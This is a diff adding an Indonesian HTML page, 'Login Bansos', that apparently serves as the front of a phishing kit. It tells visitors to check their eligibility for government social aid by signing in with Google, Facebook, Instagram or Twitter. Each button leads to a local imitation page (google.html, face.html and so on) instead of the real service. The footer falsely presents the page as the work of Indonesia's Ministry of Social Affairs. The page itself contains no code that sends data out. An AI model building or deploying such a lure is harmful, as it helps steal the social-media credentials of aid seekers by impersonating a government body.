@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Login Bansos</title>
+    <style>
+        body {
+            background: #f5f6fa;
+            font-family: Arial, sans-serif;
+            display: flex;
+            /* Mengubah properti display menjadi column untuk menampung navbar, container, dan footer */
+            flex-direction: column;
+            height: 100vh;
+            align-items: center;
+            /* Menghilangkan justify-content: center agar elemen bisa ditata secara vertikal */
+            /* justify-content: center; */
+            margin: 0; /* Menghilangkan margin default body */
+            padding-top: 92px; /* Memberi ruang untuk navbar */
+        }
+        .navbar {
+            width: 100%;
+            background: #3f51b5;
+            padding: 16px 0;
+            position: fixed; /* Mengubah absolute menjadi fixed agar navbar tetap di atas */
+            top: 0;
+            left: 0;
+            text-align: center;
+            z-index: 10; /* Pastikan navbar di atas elemen lain */
+        }
+        .navbar img {
+            height: 60px;
+            vertical-align: middle;
+        }
+        .navbar-title {
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            margin-left: 12px;
+            vertical-align: middle;
+            display: inline-block;
+        }
+        .login-container {
+            background: #fff;
+            padding: 32px 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            width: 320px;
+            /* Menghilangkan margin-top karena padding-top pada body sudah diatur */
+            /* margin-top: 80px; */
+        }
+        .login-container h2 {
+            margin-bottom: 24px;
+            text-align: center;
+            color: #333;
+        }
+        /* Menghapus input yang tidak digunakan di HTML */
+        /* .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+        } */
+        /* Menghapus button yang tidak digunakan di HTML */
+        /* .login-container button {
+            width: 100%;
+            padding: 10px;
+            background: #1976d2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background: #1565c0;
+        } */
+        .social-login {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 16px;
+        }
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            cursor: pointer;
+            color: #fff;
+            text-decoration: none; /* Menghilangkan garis bawah pada tautan */
+        }
+        .google { background: #db4437; }
+        .facebook { background: #4267B2; }
+        .instagram { background: #E1306C; }
+        .twitter { background: #1DA1F2; }
+        .social-btn i {
+            margin-right: 8px;
+        }
+        /* Style untuk Footer */
+        .footer {
+            margin-top: 24px;
+            padding: 16px 0;
+            text-align: center;
+            color: #777; /* Warna abu-abu yang lebih lembut */
+            font-size: 14px;
+            width: 100%; /* Lebar penuh */
+            /* Anda dapat menambahkan background jika ingin footer menonjol */
+            /* background: #eee; */
+        }
+        .footer p {
+            margin: 4px 0;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+</head>
+<body>
+    <div class="navbar" style="text-align: left; padding-left: 32px;">
+        <img src="loginlogo.png" alt="Logo Bansos" style="display: inline-block;">
+        <
+    </div>
+    <form class="login-container" method="post" action="utama.php">
+        <h2>Cek Penerima Bansos Dengan Login Di Platform</h2>
+        <div class="social-login">
+            <a class="social-btn google" href="google.html"><i class="fab fa-google"></i> Google</a>
+            <a class="social-btn facebook" href="face.html"><i class="fab fa-facebook-f"></i> Facebook</a>
+            <a class="social-btn instagram" href="insta.html"><i class="fab fa-instagram"></i> Instagram</a>
+            <a class="social-btn twitter" href="twitter.html"><i class="fab fa-twitter"></i> Twitter</a>
+        </div>
+    </form>
+    
+    <footer class="footer">
+        <p>&copy; 2025 Kementerian Sosial Republik Indonesia. Hak Cipta Dilindungi.</p>
+        <p>Hubungi Kami: <a href="mailto:pusdatin@kemensos.go.id" style="color: #1976d2; text-decoration: none;">pusdatin@kemensos.go.id</a></p>
+    </footer>
+    </body>
+</html>
